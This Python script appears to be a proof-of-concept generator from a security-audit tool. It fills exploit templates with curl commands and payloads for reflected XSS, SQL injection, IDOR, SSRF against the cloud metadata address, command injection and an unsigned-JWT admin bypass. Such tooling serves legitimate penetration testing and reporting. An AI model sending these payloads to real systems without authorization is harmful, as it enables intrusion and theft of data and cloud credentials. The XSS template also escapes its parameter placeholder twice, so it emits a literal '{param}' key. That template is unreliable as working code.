#!/usr/bin/env python3
"""
DeepSight PoC Generator — Creates runnable exploit proofs for Critical findings.
Usage: python generate-poc.py --type xss --url "https://api.example.com/login" --param user --payload "<img src=x onerror=alert(1)>"
"""

import argparse
import json
import sys
from pathlib import Path

# PoC templates by vulnerability type
POC_TEMPLATES = {
    "xss": {
        "name": "Cross-Site Scripting (Reflected)",
        "template": """curl -X {method} {url} \\
  -H "Content-Type: application/json" \\
  -d '{{"{{param}}": "{payload}"}}'
# Result: Payload renders unescaped in response.
# Verify: Check browser console for alert(1) execution.""",
        "params": ["method", "url", "param", "payload"],
    },
    "sqli": {
        "name": "SQL Injection",
        "template": """curl -X {method} {url}?{param}='{payload}'
# Result: Database error or unauthorized data access.
# Verify: Check response for SQL error messages or leaked data.""",
        "params": ["method", "url", "param", "payload"],
    },
    "idor": {
        "name": "Insecure Direct Object Reference",
        "template": """curl -X {method} {url}/{target_id}
# Result: Access to another user's resource without authorization.
# Verify: Confirm resource belongs to different user.""",
        "params": ["method", "url", "target_id"],
    },
    "ssrf": {
        "name": "Server-Side Request Forgery",
        "template": """curl -X {method} {url}?url=http://169.254.169.254/latest/meta-data/
# Result: Server makes request to internal metadata endpoint.
# Verify: Check response for AWS metadata or internal service data.""",
        "params": ["method", "url"],
    },
    "command_injection": {
        "name": "OS Command Injection",
        "template": """curl -X {method} {url}?{param}={payload}
# Result: Arbitrary command execution on server.
# Verify: Check for command output or server-side file creation.""",
        "params": ["method", "url", "param", "payload"],
    },
    "jwt_bypass": {
        "name": "JWT Authentication Bypass",
        "template": """# Generate unsigned JWT
python3 -c "import jwt; print(jwt.encode({{'role':'admin'}}, None, algorithm='none'))"
# Use the token in request:
curl -X {method} {url} \\
  -H "Authorization: Bearer <unsigned_token>"
# Result: Authentication bypassed, admin access granted.""",
        "params": ["method", "url"],
    },
    "hardcoded_secret": {
        "name": "Hardcoded Secret Exposure",
        "template": """# Secret found in: {file}:{line}
# Impact: Anyone with repository access can use this credential.
# Fix: Move to environment variable or secrets manager.""",
        "params": ["file", "line"],
    },
}

DEFAULT_PAYLOADS = {
    "xss": "<img src=x onerror=alert(1)>",
    "sqli": "' OR 1=1 --",
    "idor": "1",  # increment by 1 from expected ID
    "ssrf": "http://169.254.169.254/latest/meta-data/",
    "command_injection": "; ls -la",
}


def generate_poc(vuln_type, **kwargs):
    """Generate a PoC exploit for the given vulnerability type."""
    vuln_type = vuln_type.lower().replace("-", "_")

    if vuln_type not in POC_TEMPLATES:
        return f"# No PoC template for vulnerability type: {vuln_type}\n# Manual review required."

    template_data = POC_TEMPLATES[vuln_type]
    template = template_data["template"]
    params = template_data["params"]

    # Fill in defaults for missing params
    for param in params:
        if param not in kwargs:
            if param in DEFAULT_PAYLOADS:
                kwargs[param] = DEFAULT_PAYLOADS[param]
            elif param == "method":
                kwargs[param] = "POST"
            elif param == "url":
                kwargs[param] = "https://target.example.com/endpoint"
            elif param == "target_id":
                kwargs[param] = "2"
            else:
                kwargs[param] = f"<{param}>"

    try:
        poc = template.format(**kwargs)
    except KeyError as e:
        poc = f"# Missing parameter: {e}\n# Template: {template}"

    header = f"## Exploit Proof: {template_data['name']}\n"
    return header + poc


def main():
    parser = argparse.ArgumentParser(description="DeepSight PoC Generator")
    parser.add_argument("--type", required=True, help="Vulnerability type (xss, sqli, idor, ssrf, etc.)")
    parser.add_argument("--url", help="Target URL")
    parser.add_argument("--param", help="Vulnerable parameter name")
    parser.add_argument("--payload", help="Exploit payload")
    parser.add_argument("--method", help="HTTP method (default: POST)")
    parser.add_argument("--file", help="Source file path")
    parser.add_argument("--line", help="Line number")
    parser.add_argument("--output", help="Output file (default: stdout)")
    parser.add_argument("--json", action="store_true", help="Output as JSON")

    args = parser.parse_args()
    kwargs = {k: v for k, v in vars(args).items() if v and k not in ("type", "output", "json")}

    poc = generate_poc(args.type, **kwargs)

    if args.json:
        result = {"type": args.type, "poc": poc, "params": kwargs}
        poc = json.dumps(result, indent=2)

    if args.output:
        Path(args.output).write_text(poc)
        print(f"PoC written to {args.output}")
    else:
        print(poc)


if __name__ == "__main__":
    main()
